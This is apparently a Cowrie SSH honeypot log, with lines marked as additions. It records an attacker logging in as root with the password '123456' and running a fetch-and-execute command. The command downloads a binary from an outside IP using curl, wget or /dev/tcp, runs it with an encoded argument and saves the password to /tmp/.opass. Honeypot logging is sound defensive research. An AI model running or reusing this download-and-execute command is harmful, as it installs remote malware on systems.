+2026-07-09T07:54:25.419592Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T07:54:25.606962Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T07:54:35.352651Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T07:54:35.352826Z [HoneyPotSSHTransport,54,71.6.199.87] Connection lost after 10.0 seconds
+2026-07-09T12:12:13.737349Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 123.57.51.183:39146 (10.0.2.192:2222) [session: 3530f253319b]
+2026-07-09T12:12:13.737973Z [HoneyPotSSHTransport,55,123.57.51.183] Remote SSH version: SSH-2.0-russh_0.51.1
+2026-07-09T12:12:13.975363Z [HoneyPotSSHTransport,55,123.57.51.183] SSH client hassh fingerprint: 1b8acd46a07d2dc9854db9ec4044c45c
+2026-07-09T12:12:13.976220Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ssh-ed25519'
+2026-07-09T12:12:13.976289Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes256-ctr' b'hmac-sha2-512' b'none'
+2026-07-09T12:12:13.976340Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes256-ctr' b'hmac-sha2-512' b'none'
+2026-07-09T12:12:15.593766Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T12:12:17.345329Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T12:12:18.359575Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-07-09T12:12:18.362108Z [HoneyPotSSHTransport,55,123.57.51.183] login attempt [b'root'/b'tMx6PlEz0N'] failed
+2026-07-09T12:12:19.363921Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2026-07-09T12:12:19.364128Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2026-07-09T12:12:19.601171Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-07-09T12:12:19.601594Z [HoneyPotSSHTransport,55,123.57.51.183] login attempt [b'root'/b'123456'] succeeded
+2026-07-09T12:12:19.602707Z [HoneyPotSSHTransport,55,123.57.51.183] Initialized emulated server as architecture: linux-x64-lsb
+2026-07-09T12:12:19.603154Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'
+2026-07-09T12:12:19.603339Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2026-07-09T12:12:20.133674Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2026-07-09T12:12:20.133927Z [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2026-07-09T12:12:20.370981Z [twisted.conch.ssh.session#info] Getting shell
+2026-07-09T12:12:20.530048Z [HoneyPotSSHTransport,55,123.57.51.183] CMD: echo 1 > /dev/null && cat /bin/echo
+2026-07-09T12:12:20.530546Z [HoneyPotSSHTransport,55,123.57.51.183] Command found: echo 
+2026-07-09T12:12:20.531213Z [HoneyPotSSHTransport,55,123.57.51.183] Command found: cat /bin/echo
+2026-07-09T12:12:24.147046Z [HoneyPotSSHTransport,55,123.57.51.183] CMD: nohup $SHELL -c "curl http://101.200.38.229:6032/linux -o /tmp/GZ3xQ8nD6q; if [ ! -f /tmp/GZ3xQ8nD6q ]; then wget http://101.200.38.229:6032/linux -O /tmp/GZ3xQ8nD6q; fi; if [ ! -f /tmp/GZ3xQ8nD6q ]; then exec 6<>/dev/tcp/101.200.38.229/6032 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/GZ3xQ8nD6q ; chmod +x /tmp/GZ3xQ8nD6q && /tmp/GZ3xQ8nD6q meF9YsJDiPIFdNekUEqk12AL84lc2mti8+Xs735hz0ON9wds1qFUVbDXagzriF7JfX325Prwe2nNVI70HWvWoUpVo9V0DPOJQ8hqdvfj7fVsYsNel/QMaMihV1G+12oP/4FdymFs8+bk731rykOA/BNt16pSVKHWbx30iVzUYX72+uDzYmLPW4PzCGvWsFZWoshrBfCXXMphYvjg7vh9ZM1NiP0OdNehSlai0HQP9Y5XzWJ+9PTl8X19yF2J6w5iyKJWXarQag73mVXUYn/1+ufyYmHIWIPyDmvUsFdSvtdpDuuIXMp9fvLn7vh+YMlNiPUMdNejV0qh0WgT9I5fwGR99eP08H5i1FmI6wlqyKFVVqreaA70mVnNfXT3+ufyYmLDWIPzDWvVoERVotV0CPKXWMt9ffnn7vd7Y81NjfITa9alSlOkyGsE8INaymd74ebl+WJlykOI9QV016ZVXqfebQvljFTUYn3x+uX0fn3IX4H/BGjfokRVoNd0D/WJQ8llYvDn4Pt6Ys9fmfQPaMilVUqi1nQM8YlXzGZ68/Tl9H59y16P6wxr075VUKfcbAz0iU3LY33v5efyYmLNX5f0Cmjcp1VQp8ZrD/eXWMt9ffXj+vN5ac1agfAda9OiSleiyGgJ9ZdczGR2+OHh92xnyUOI9g501KBXSqHfbgfzi13Oc3355/rwfX3IX4/rD2rRqlNVotN6DPyKQ8tifu/l5/RiYspfg/0NatSwUFe+12kF64hZz3149O7j93hj2lmO6wxo175VV6jIaAz0g1vMY3UgbZKT740x/GoJaTOuyqOPU1c5iOAVwN6s9Lym; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/GZ3xQ8nD6q && /tmp/GZ3xQ8nD6q meF9YsJDiPIFdNekUEqk12AL84lc2mti8+Xs735hz0ON9wds1qFUVbDXagzriF7JfX325Prwe2nNVI70HWvWoUpVo9V0DPOJQ8hqdvfj7fVsYsNel/QMaMihV1G+12oP/4FdymFs8+bk731rykOA/BNt16pSVKHWbx30iVzUYX72+uDzYmLPW4PzCGvWsFZWoshrBfCXXMphYvjg7vh9ZM1NiP0OdNehSlai0HQP9Y5XzWJ+9PTl8X19yF2J6w5iyKJWXarQag73mVXUYn/1+ufyYmHIWIPyDmvUsFdSvtdpDuuIXMp9fvLn7vh+YMlNiPUMdNejV0qh0WgT9I5fwGR99eP08H5i1FmI6wlqyKFVVqreaA70mVnNfXT3+ufyYmLDWIPzDWvVoERVotV0CPKXWMt9ffnn7vd7Y81NjfITa9alSlOkyGsE8INaymd74ebl+WJlykOI9QV016ZVXqfebQvljFTUYn3x+uX0fn3IX4H/BGjfokRVoNd0D/WJQ8llYvDn4Pt6Ys9fmfQPaMilVUqi1nQM8YlXzGZ68/Tl9H59y16P6wxr075VUKfcbAz0iU3LY33v5efyYmLNX5f0Cmjcp1VQp8ZrD/eXWMt9ffXj+vN5ac1agfAda9OiSleiyGgJ9ZdczGR2+OHh92xnyUOI9g501KBXSqHfbgfzi13Oc3355/rwfX3IX4/rD2rRqlNVotN6DPyKQ8tifu/l5/RiYspfg/0NatSwUFe+12kF64hZz3149O7j93hj2lmO6wxo175VV6jIaAz0g1vMY3UgbZKT740x/GoJaTOuyqOPU1c5iOAVwN6s9Lym" &
+2026-07-09T12:12:24.148572Z [HoneyPotSSHTransport,55,123.57.51.183] Command found: nohup /bin/bash -c curl http://101.200.38.229:6032/linux -o /tmp/GZ3xQ8nD6q; if [ ! -f /tmp/GZ3xQ8nD6q ]; then wget http://101.200.38.229:6032/linux -O /tmp/GZ3xQ8nD6q; fi; if [ ! -f /tmp/GZ3xQ8nD6q ]; then exec 6<>/dev/tcp/101.200.38.229/6032 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/GZ3xQ8nD6q ; chmod +x /tmp/GZ3xQ8nD6q && /tmp/GZ3xQ8nD6q meF9YsJDiPIFdNekUEqk12AL84lc2mti8+Xs735hz0ON9wds1qFUVbDXagzriF7JfX325Prwe2nNVI70HWvWoUpVo9V0DPOJQ8hqdvfj7fVsYsNel/QMaMihV1G+12oP/4FdymFs8+bk731rykOA/BNt16pSVKHWbx30iVzUYX72+uDzYmLPW4PzCGvWsFZWoshrBfCXXMphYvjg7vh9ZM1NiP0OdNehSlai0HQP9Y5XzWJ+9PTl8X19yF2J6w5iyKJWXarQag73mVXUYn/1+ufyYmHIWIPyDmvUsFdSvtdpDuuIXMp9fvLn7vh+YMlNiPUMdNejV0qh0WgT9I5fwGR99eP08H5i1FmI6wlqyKFVVqreaA70mVnNfXT3+ufyYmLDWIPzDWvVoERVotV0CPKXWMt9ffnn7vd7Y81NjfITa9alSlOkyGsE8INaymd74ebl+WJlykOI9QV016ZVXqfebQvljFTUYn3x+uX0fn3IX4H/BGjfokRVoNd0D/WJQ8llYvDn4Pt6Ys9fmfQPaMilVUqi1nQM8YlXzGZ68/Tl9H59y16P6wxr075VUKfcbAz0iU3LY33v5efyYmLNX5f0Cmjcp1VQp8ZrD/eXWMt9ffXj+vN5ac1agfAda9OiSleiyGgJ9ZdczGR2+OHh92xnyUOI9g501KBXSqHfbgfzi13Oc3355/rwfX3IX4/rD2rRqlNVotN6DPyKQ8tifu/l5/RiYspfg/0NatSwUFe+12kF64hZz3149O7j93hj2lmO6wxo175VV6jIaAz0g1vMY3UgbZKT740x/GoJaTOuyqOPU1c5iOAVwN6s9Lym; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/GZ3xQ8nD6q && /tmp/GZ3xQ8nD6q meF9YsJDiPIFdNekUEqk12AL84lc2mti8+Xs735hz0ON9wds1qFUVbDXagzriF7JfX325Prwe2nNVI70HWvWoUpVo9V0DPOJQ8hqdvfj7fVsYsNel/QMaMihV1G+12oP/4FdymFs8+bk731rykOA/BNt16pSVKHWbx30iVzUYX72+uDzYmLPW4PzCGvWsFZWoshrBfCXXMphYvjg7vh9ZM1NiP0OdNehSlai0HQP9Y5XzWJ+9PTl8X19yF2J6w5iyKJWXarQag73mVXUYn/1+ufyYmHIWIPyDmvUsFdSvtdpDuuIXMp9fvLn7vh+YMlNiPUMdNejV0qh0WgT9I5fwGR99eP08H5i1FmI6wlqyKFVVqreaA70mVnNfXT3+ufyYmLDWIPzDWvVoERVotV0CPKXWMt9ffnn7vd7Y81NjfITa9alSlOkyGsE8INaymd74ebl+WJlykOI9QV016ZVXqfebQvljFTUYn3x+uX0fn3IX4H/BGjfokRVoNd0D/WJQ8llYvDn4Pt6Ys9fmfQPaMilVUqi1nQM8YlXzGZ68/Tl9H59y16P6wxr075VUKfcbAz0iU3LY33v5efyYmLNX5f0Cmjcp1VQp8ZrD/eXWMt9ffXj+vN5ac1agfAda9OiSleiyGgJ9ZdczGR2+OHh92xnyUOI9g501KBXSqHfbgfzi13Oc3355/rwfX3IX4/rD2rRqlNVotN6DPyKQ8tifu/l5/RiYspfg/0NatSwUFe+12kF64hZz3149O7j93hj2lmO6wxo175VV6jIaAz0g1vMY3UgbZKT740x/GoJaTOuyqOPU1c5iOAVwN6s9Lym &
+2026-07-09T12:12:24.150085Z [HoneyPotSSHTransport,55,123.57.51.183] CMD: head -c 3716336 > /tmp/VMyKozDYQy
+2026-07-09T12:12:24.150534Z [HoneyPotSSHTransport,55,123.57.51.183] Command found: head -c
+2026-07-09T12:12:24.322117Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322272Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322330Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322376Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322419Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322465Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322504Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322542Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322579Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322617Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322719Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322821Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.322870Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323063Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323225Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x1c'
+2026-07-09T12:12:24.323323Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323390Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323431Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323468Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323555Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323600Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323645Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323684Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323724Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323760Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323796Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323832Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323868Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323904Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323939Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.323974Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324009Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324044Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324079Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324114Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324158Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324194Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324230Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324319Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324408Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324559Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324611Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324653Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324691Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324729Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324765Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324802Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324840Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324876Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324912Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324950Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.324986Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325022Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325058Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325097Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325134Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325169Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325205Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325241Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325277Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325336Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325372Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325408Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325500Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325547Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325588Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325626Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325663Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325699Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325743Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325866Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325915Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325953Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.325990Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.326027Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.326134Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327207Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327291Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327337Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327394Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327435Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327473Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327596Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xa3'
+2026-07-09T12:12:24.327646Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327686Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327724Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327761Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327799Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.327835Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.379588Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.379739Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.379796Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.379842Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.379884Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.379923Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380022Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380074Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380113Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380202Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380251Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380291Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380328Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380366Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380408Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380446Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380482Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380518Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380554Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380589Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380625Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380661Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x80'
+2026-07-09T12:12:24.380697Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xe3'
+2026-07-09T12:12:24.380733Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380769Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380805Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380841Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380876Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380911Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.380947Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x80'
+2026-07-09T12:12:24.380983Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xe3'
+2026-07-09T12:12:24.381019Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381055Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381091Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381127Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381163Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381201Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xb2'
+2026-07-09T12:12:24.381291Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381339Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381379Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381417Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381455Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381493Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xb2'
+2026-07-09T12:12:24.381577Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381622Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381660Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381698Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381734Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.381771Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.382828Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
